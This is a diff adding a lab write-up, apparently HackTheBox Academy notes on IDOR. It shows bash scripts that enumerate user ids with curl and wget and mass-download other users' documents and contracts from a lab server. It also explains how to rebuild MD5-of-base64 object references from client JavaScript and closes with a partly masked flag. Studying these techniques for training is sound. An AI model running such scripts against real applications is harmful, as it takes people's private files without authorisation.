@@ -121,3 +121,129 @@ for i in {1..10}; do
         done
 done
 ```
+
+_**Repeat what you learned in this section to get a list of documents of the first 20 user uid's in /documents.php, one of which should have a '.txt' file with the flag.**_
+
+```
+curl -X POST http://94.237.49.212:55717/documents.php -d "uid=1" | grep -oP "\/documents.*?.pdf"
+```
+
+So now we need to make the bash script ->
+
+```
+#!/bin/bash
+
+url="http://94.237.49.212:55717"
+
+for i in {1..20}; do
+    for link in $(curl -X POST "$url/documents.php" -d "uid=$i" | grep -oP "\/documents.*?\.[a-zA-Z0-9]{2,4}"); do
+        wget -q $url/$link
+    done
+done
+```
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+## Bypassing Encoded References
+
+In some cases, web applications make hashes or encode their object references, making enumeration more difficult
+
+Let's imagine the `Employment_contract.pdf` file ->
+
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+We can see a `POST` request to `download.php`, it's a common practice to avoid directly linking to files, as that may be exploitable with multiple web attacks.
+
+We can try and guess how it's hashed but it's very difficult ->
+
+```shell-session
+ElFelixi0@htb[/htb]$ echo -n 1 | md5sum
+
+c4ca4238a0b923820dcc509a6f75849b -
+```
+
+We can start looking for a link in the source code with JavaScript function with `javascript:downloadContract('1')`. Looking at the `downloadContract()` function in the source code
+
+```javascript
+function downloadContract(uid) {
+    $.redirect("/download.php", {
+        contract: CryptoJS.MD5(btoa(uid)).toString(),
+    }, "POST", "_self");
+}
+```
+
+In this case, the value being hashed is `btoa(uid)`, which is the `base64` encoded string of the `uid` variable
+
+And we cantry and replicate how the backend makes our hash ->
+
+```shell-session
+ElFelixi0@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum
+
+cdd96d3cc73d1dbdaffa03cc6cd7339b -
+```
+
+Then we can use bash to make a big lists of uids ->&#x20;
+
+```shell-session
+ElFelixi0@htb[/htb]$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
+
+cdd96d3cc73d1dbdaffa03cc6cd7339b
+0b7e7dee87b1c3b98e72131173dfbbbf
+<SNIP>
+```
+
+And make a post request with the hashes to download the ones that exist ->
+
+```bash
+#!/bin/bash
+
+for i in {1..10}; do
+    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
+        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
+    done
+done
+```
+
+_**Try to download the contracts of the first 20 employee, one of which should contain the flag, which you can read with 'cat'. You can either calculate the 'contract' parameter value, or calculate the '.pdf' file name directly.**_
+
+We see the name of the contract through the URL->
+
+```
+file:///home/htb-ac-1032889/Downloads/contract_c4ca4238a0b923820dcc509a6f75849b.pdf
+```
+
+<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+So we have to make a bash script to go and download every request ->
+
+```
+#!/bin/bash
+
+# Function to generate the URL
+downloadContract() {
+  uid=$1
+  # Encode UID in base64
+  encoded_uid=$(echo -n "$uid" | base64)
+  # Encode the base64 string for URL
+  url_encoded_uid=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$encoded_uid'''))")
+  # Generate the URL
+  wget "http://94.237.49.212:40129/download.php?contract=${url_encoded_uid}"
+}
+
+# Loop from 1 to 20 and print the URLs
+for i in {1..20}; do
+  downloadContract "$i"
+done
+```
+
+<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>
+
+```
+┌─[root@htb-m9r0jjfj1n]─[/home/htb-ac-1032889/test/test2]
+└──╼ #cat 'download.php?contract=MjA='
+HTB{h45h1n6_1d5_w0n7_****}
+```
+
+This one was hard :joy:
